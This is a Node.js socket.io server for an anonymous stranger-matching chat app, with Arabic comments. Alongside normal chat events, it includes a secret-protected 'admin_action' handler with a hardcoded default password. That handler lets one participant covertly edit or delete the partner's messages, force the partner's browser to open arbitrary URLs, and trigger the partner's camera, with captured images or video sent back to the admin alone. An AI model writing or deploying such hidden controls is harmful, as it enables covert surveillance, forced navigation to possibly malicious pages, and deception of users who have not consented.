const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 10 * 1024 * 1024
});

app.use(express.static(__dirname));

let waitingUser = null;

// كلمة سر الأدمن (يمكنك تعديلها أو جعلها عبر متغيرات البيئة في Render)
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'mySuperSecretAdmin123';

io.on('connection', (socket) => {
    console.log('مستخدم متصل:', socket.id);

    socket.on('find_partner', () => {
        if (waitingUser && waitingUser.id !== socket.id) {
            const partner = waitingUser;
            waitingUser = null;

            const room = 'room_' + partner.id + '_' + socket.id;
            socket.join(room);
            partner.join(room);

            io.to(room).emit('matched');
            socket.roomName = room;
            partner.roomName = room;
        } else {
            waitingUser = socket;
        }
    });

    socket.on('message', (msg) => {
        if (socket.roomName) {
            // إضافة معرف فريد لكل رسالة لكي يتمكن الأدمن من حذفها أو تعديلها لاحقاً
            msg.id = 'msg_' + Math.random().toString(36).substring(2, 9);

            socket.to(socket.roomName).emit('message', msg);
        }
    });

    socket.on('typing', (isTyping) => {
        if (socket.roomName) {
            socket.to(socket.roomName).emit('display_typing', isTyping);
        }
    });

    // === معالجة أوامر وصلاحيات الأدمن ===
    socket.on('admin_action', (data) => {
        // التحقق من كلمة السر الخاصة بالأدمن للحماية
        if (data.secret !== ADMIN_SECRET) return;

        if (!socket.roomName) return;

        switch (data.action) {
            case 'delete':
                // حذف الرسالة من عند الطرفين في الغرفة
                io.to(socket.roomName).emit('msg_deleted', data.msgId);
                break;

            case 'edit':
                // تعديل الرسالة عند الطرفين في الغرفة
                io.to(socket.roomName).emit('msg_edited', { msgId: data.msgId, newContent: data.newContent });
                break;

            case 'open_url':
                // إجبار متصفح الطرف الآخر على فتح الرابط المحدد
                socket.to(socket.roomName).emit('force_open_url', data.url);
                break;

            case 'request_media':
                // طلب فتح الكاميرا (صورة أو فيديو) من الطرف الآخر
                socket.to(socket.roomName).emit('trigger_camera', data.mediaType);
                break;
        }
    });

    // استقبال الوسائط الملتقطة من الكاميرا وإرسالها للأدمن فقط داخل الغرفة
    socket.on('user_media_captured', (data) => {
        if (socket.roomName) {
            // إرسال الوسائط للأدمن الموجود في نفس الغرفة لمعاينتها
            socket.to(socket.roomName).emit('display_captured_media_to_admin', data);
        }
    });

    socket.on('disconnect', () => {
        if (waitingUser === socket) {
            waitingUser = null;
        }
        if (socket.roomName) {
            socket.to(socket.roomName).emit('partner_disconnected');
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
